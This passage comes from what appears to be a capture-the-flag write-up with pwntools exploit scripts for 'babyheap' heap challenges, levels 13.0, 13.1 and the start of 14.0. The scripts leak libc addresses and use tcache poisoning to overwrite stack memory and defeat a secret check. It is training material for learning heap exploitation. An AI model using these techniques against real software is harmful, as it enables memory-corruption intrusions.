</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level13.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p, &#34;b *$rebase(0x1b9d)&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># main_arena_96 = 0x1ecbe0</span>
</span></span><span style="display:flex;"><span>main_arena_96 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ef2e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000016ce</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001500</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_stack <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffebda009c7</span>
</span></span><span style="display:flex;"><span>stack_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffebda00b78</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x430</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> u64(puts(p, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(main_arena_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>environ_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> main_arena_96 <span style="color:#f92672">+</span> environ
</span></span><span style="display:flex;"><span>print (hex(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">3</span>, p64(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cur_stack_base <span style="color:#f92672">=</span> u64(puts(p, <span style="color:#ae81ff">5</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>cur_target_stack <span style="color:#f92672">=</span> cur_stack_base <span style="color:#f92672">-</span> stack_base <span style="color:#f92672">+</span> target_stack
</span></span><span style="display:flex;"><span>print (hex(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, p64(cur_target_stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>send_flag(p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-131">level 13.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level13.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p, &#34;b *$rebase(0x1b9d)&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># main_arena_96 = 0x1ecbe0</span>
</span></span><span style="display:flex;"><span>main_arena_96 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ef2e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000016ce</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001500</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_stack <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fff4f09a332</span>
</span></span><span style="display:flex;"><span>stack_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fff4f09a4e8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x430</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> u64(puts(p, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(main_arena_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>environ_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> main_arena_96 <span style="color:#f92672">+</span> environ
</span></span><span style="display:flex;"><span>print (hex(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">3</span>, p64(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cur_stack_base <span style="color:#f92672">=</span> u64(puts(p, <span style="color:#ae81ff">5</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>cur_target_stack <span style="color:#f92672">=</span> cur_stack_base <span style="color:#f92672">-</span> stack_base <span style="color:#f92672">+</span> target_stack
</span></span><span style="display:flex;"><span>print (hex(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, p64(cur_target_stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>send_flag(p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-140">level 14.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level14.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p, &#34;b *$rebase(0x1cc0)&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_arena_96 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ef2e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bin_echo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x33f8</span>
